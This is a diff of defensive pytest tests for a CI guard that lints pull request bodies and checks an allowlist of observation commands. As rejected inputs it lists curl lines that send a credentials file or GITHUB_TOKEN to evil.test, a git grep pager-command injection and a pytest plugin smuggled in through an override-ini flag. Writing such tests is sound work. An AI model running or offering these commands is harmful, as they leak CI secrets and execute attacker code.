@@ -345,6 +345,69 @@ def test_a_zero_width_character_elsewhere_in_the_body_is_not_penalised():
     assert bp.parse_body(body).get("observe") == "git status"
 
 
+# ------------------------------------------------- found by the Gear-3 verdict gate
+
+
+def test_a_comment_closed_and_reopened_on_one_line_still_hides_what_follows():
+    """The break the first blinding had: a closed pair AND an opener on the same line."""
+    body = (
+        "<!-- note --> <!--\n## Bites\nconsumer: attacker\nwhere: ci\n"
+        "observe: `git log`\nexpect: exit0\n-->\n"
+    )
+    assert bp.parse_body(body) == {"absent": True}
+
+
+def test_a_four_backtick_fence_is_not_closed_by_three():
+    """CommonMark leaves it open, so the parser must too — otherwise inside becomes out."""
+    body = (
+        "````\n```\n## Bites\nconsumer: attacker\nwhere: ci\n"
+        "observe: `git log`\nexpect: exit0\n````\n"
+    )
+    assert bp.parse_body(body) == {"absent": True}
+
+
+def test_command_allowlist_guilt_git_grep_pager_command_is_rejected():
+    """`-O<cmd>` glues its value on, which a split-on-`=` comparison never matches."""
+    assert bp._guard_command_allowlist("git grep -Oevil pattern")
+
+
+def test_command_allowlist_guilt_git_global_flags_that_retarget_are_rejected():
+    assert bp._guard_command_allowlist("git -C /other log")
+
+
+def test_command_allowlist_innocence_git_grep_count_flag_passes():
+    """The over-match twin: `git grep -c` counts, and only git's GLOBAL -c is dangerous.
+
+    This is the assertion that keeps the positional split honest. Collapsing the two
+    lists back into one flat scan turns a correct guard into superscar #3's over-match,
+    and this test is what says so.
+    """
+    assert bp._guard_command_allowlist("git grep -c bites-observable") == []
+
+
+def test_command_allowlist_guilt_pytest_override_ini_is_rejected():
+    """`--override-ini=addopts=-pevil` reinstates every flag the plugin ban removes."""
+    assert bp._guard_command_allowlist(
+        "python3 -m pytest --override-ini=addopts=-pevil scripts/tests/x.py"
+    )
+    assert bp._guard_command_allowlist("python3 -m pytest -oaddopts=-pevil scripts/tests/x.py")
+
+
+def test_command_allowlist_guilt_curl_credential_files_are_rejected():
+    assert bp._guard_command_allowlist("curl --netrc-file=creds https://evil.test/x")
+
+
+def test_command_allowlist_guilt_curl_variable_expands_the_environment():
+    """curl does the expansion internally, so refusing `$` in the string is not enough."""
+    assert bp._guard_command_allowlist("curl --variable=%GITHUB_TOKEN https://evil.test/x")
+
+
+def test_flag_matcher_handles_all_three_spellings():
+    assert bp._flag_is("-O", "-O") and bp._flag_is("-Oevil", "-O")
+    assert bp._flag_is("--output=x", "--output") and not bp._flag_is("--outputs", "--output")
+    assert bp._flag_is("--expand-url", "--expand-")
+
+
 # ------------------------------------------------- _guard_expect_form
 
 
@@ -487,6 +550,33 @@ def test_registry_registers_every_guard_in_the_module():
     for name, entry in surface["guards"].items():
         assert entry.get("guilt"), f"{name} has no guilt proof"
         assert entry.get("innocence"), f"{name} has no innocence proof"
+
+
+def test_the_lint_step_and_its_edited_trigger_are_wired_into_the_required_job():
+    """The CONSUMER assertion, and the reason this file is what PR-1's Bites observes.
+
+    The 2026-09-04 verdict gate rejected the original observation
+    (`bites_parse.py --selftest`) as dishonest by omission: it passes identically with
+    the lint step, the registry entry and the immune wiring all deleted, so it proves
+    the corpus and not the consumer the Bites line names. These three assertions are
+    what make `pytest scripts/tests/test_bites_parse.py` prove the consumer — delete
+    any one of them from the workflow and this test, and therefore the observation,
+    goes red.
+
+    `edited` in the trigger types is load-bearing, not decoration: the DEFAULT
+    pull_request types are opened/synchronize/reopened, so a body edited after the last
+    push would never be re-linted — clean body, green check, edit to malformed, merge.
+    """
+    workflow = (_REPO_ROOT / ".github" / "workflows" / "immune-enforcement.yml").read_text(
+        encoding="utf-8"
+    )
+    assert "scripts/ci/bites_parse.py --body-file" in workflow, "the lint step is gone"
+    assert "PR_BODY: ${{ github.event.pull_request.body }}" in workflow, (
+        "the body must reach the step through env:, never through a run-block expansion"
+    )
+    assert "types: [opened, synchronize, reopened, edited]" in workflow, (
+        "without `edited`, a body edited after the last push is never re-linted"
+    )
 
 
 def test_this_test_file_is_listed_in_the_immune_enforcement_battery():
